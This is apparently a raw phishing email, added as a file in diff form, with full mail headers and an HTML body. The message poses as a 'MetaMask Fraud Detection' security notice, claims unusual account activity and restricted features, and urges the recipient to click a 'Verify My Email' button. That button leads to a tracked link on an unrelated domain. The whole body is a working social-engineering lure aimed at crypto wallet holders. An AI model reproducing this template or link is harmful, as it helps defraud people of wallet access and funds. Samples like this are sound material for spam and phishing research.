@@ -1,0 +1,81 @@
+Return-Path: <postmaster@3787698d80.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id 83ZFKa6JjGf4NwAAOB6+FQ
+	(envelope-from <postmaster@3787698d80.nxcli.io>)
+	for <info@vorteksenerji.com>; Sun, 19 Jan 2025 08:12:14 +0300
+Return-path: <postmaster@3787698d80.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Sun, 19 Jan 2025 08:12:14 +0300
+Received: from [72.44.80.241] (port=47626 helo=cloudhost-9411889.us-midwest-1.nxcli.net)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.96.2)
+	(envelope-from <postmaster@3787698d80.nxcli.io>)
+	id 1tZNba-0003X6-1Q
+	for info@vorteksenerji.com;
+	Sun, 19 Jan 2025 08:12:14 +0300
+Received: (qmail 20866 invoked by uid 10061); 19 Jan 2025 02:48:48 +0000
+Date: 19 Jan 2025 02:48:48 +0000
+Message-ID: <20250119024848.20851.qmail@cloudhost-9411889.us-midwest-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: =?UTF-8?B?U2VjdXJpdHkgTm90aWNlOiBZb3VyIFdhbGxldCBBY2Nlc3MgaXMgYXQgUmlzayE=?=
+X-PHP-Originating-Script: 10061:mail.php
+From: MetaMask Fraud Detection <r0h2l6wa@account-safety.net>
+Reply-To: no-reply@example.com
+Content-Type: text/html; charset=UTF-8
+X-Mailer-ID: 678c681002a4c
+X-Origin-IP: 192.168.1.133
+X-Message-ID: 3de0279267fa9cd154be319a0efe4568
+X-Origin-Time: 2025-01-19 02:48:48
+X-Campaign-ID: 671f3be95669676c
+List-Unsubscribe: <mailto:unsubscribe@example.com>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Suspicious Activity Detected</title>
+</head>
+<body style="margin: 0; padding: 0; background-color: #f7f9fc; font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
+    <!-- Wrapper -->
+    <table width="100%" cellpadding="0" cellspacing="0" style="background-color: #f7f9fc; padding: 30px 0;">
+        <tr>
+            <td align="center">
+                <!-- Email Container -->
+                <table width="600px" style="max-width: 600px; background-color: #ffffff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);">
+                    <!-- Header -->
+                    <tr>
+                        <td style="padding: 20px; text-align: center; background-color: #004085;">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png" alt="Logo" style="width: 100px; height: auto;">
+                        </td>
+                    </tr>
+                    <!-- Body -->
+                    <tr>
+                        <td style="padding: 30px; color: #333333;">
+                            <h1 style="color: #004085; font-size: 24px; text-align: center; margin-bottom: 20px;">Take Immediate Action</h1>
+                            <p>We’ve detected unusual activity associated with your account. To ensure your security, certain features have been restricted temporarily.</p>
+                            <p>Please confirm this activity and restore your account’s functionality by verifying your email:</p>
+                            <p style="text-align: center; margin: 30px 0;">
+                                <a href="https://abhijeetpublications.com/nt.php?id=-1787443436238290266-7427" style="background-color: #004085; color: #ffffff; text-decoration: none; padding: 12px 30px; border-radius: 5px; font-weight: bold; font-size: 16px;">Verify My Email</a>
+                            </p>
+                            <p>If you believe this action was taken in error, please contact our support team immediately.</p>
+                            <p>Thank you for your cooperation.</p>
+                        </td>
+                    </tr>
+                    <!-- Footer -->
+                    <tr>
+                        <td style="padding: 15px; text-align: center; font-size: 12px; background-color: #f7f9fc; color: #777777;">
+                            <p>This email was sent from a notification-only address. Please do not reply.</p>
+                            <p>&copy; 2025. All rights reserved.</p>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+</body>
+</html>
+<!-- Random-ID: 678c681002a56 -->
